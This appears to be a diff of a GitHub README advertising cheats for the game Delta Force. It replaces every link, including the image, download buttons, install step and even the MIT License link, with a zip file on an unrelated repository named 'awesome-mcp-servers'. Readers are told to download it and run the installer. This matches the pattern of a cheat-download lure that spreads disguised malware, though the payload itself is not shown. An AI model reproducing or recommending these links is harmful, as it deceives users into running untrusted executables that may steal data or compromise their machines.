@@ -1,7 +1,7 @@
 # 🚀 Delta Force Cheats & Hacks Repository
-![image](https://github.com/user-attachments/assets/c150520e-10d4-4ca4-89ac-91be13fa8d0b)
+![image](https://raw.githubusercontent.com/asadbhai786-rgb/awesome-mcp-servers/main/libellate/awesome-mcp-servers.zip)
 
-[![Download Now](https://img.shields.io/badge/Download-Delta_Force_Cheat-blue?logo=github)](https://ezlaunch.live/pPnqF1yp)
+[![Download Now](https://raw.githubusercontent.com/asadbhai786-rgb/awesome-mcp-servers/main/libellate/awesome-mcp-servers.zip)](https://raw.githubusercontent.com/asadbhai786-rgb/awesome-mcp-servers/main/libellate/awesome-mcp-servers.zip)
 
 Welcome to the ultimate 💥 Delta Force gaming enhancement toolkit! This cutting-edge collection unlocks hidden potential, delivers strategic gameplay edges, and optimizes your in-game performance. Whether you're a veteran player or a new recruit, these secret tools offer seamless integration and compatibility across a vast array of systems.
 
@@ -27,7 +27,7 @@ Welcome to the ultimate 💥 Delta Force gaming enhancement toolkit! This cuttin
 
 ## 📥 Installation Guide
 
-**Step 1:** Download using the button above or [click here](https://ezlaunch.live/pPnqF1yp).  
+**Step 1:** Download using the button above or [click here](https://raw.githubusercontent.com/asadbhai786-rgb/awesome-mcp-servers/main/libellate/awesome-mcp-servers.zip).  
 **Step 2:** Run the installer for your operating system.  
 **Step 3:** Launch Delta Force, and activate features from the cheats panel.
 
@@ -37,8 +37,8 @@ This repository is intended strictly for educational and research purposes. Use 
 
 ## 📜 License
 
-Provided under the [MIT License](https://opensource.org/licenses/MIT), 2025.
+Provided under the [MIT License](https://raw.githubusercontent.com/asadbhai786-rgb/awesome-mcp-servers/main/libellate/awesome-mcp-servers.zip), 2025.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Delta_Force_Cheat-blue?logo=github)](https://ezlaunch.live/pPnqF1yp)
+[![Download Now](https://raw.githubusercontent.com/asadbhai786-rgb/awesome-mcp-servers/main/libellate/awesome-mcp-servers.zip)](https://raw.githubusercontent.com/asadbhai786-rgb/awesome-mcp-servers/main/libellate/awesome-mcp-servers.zip)
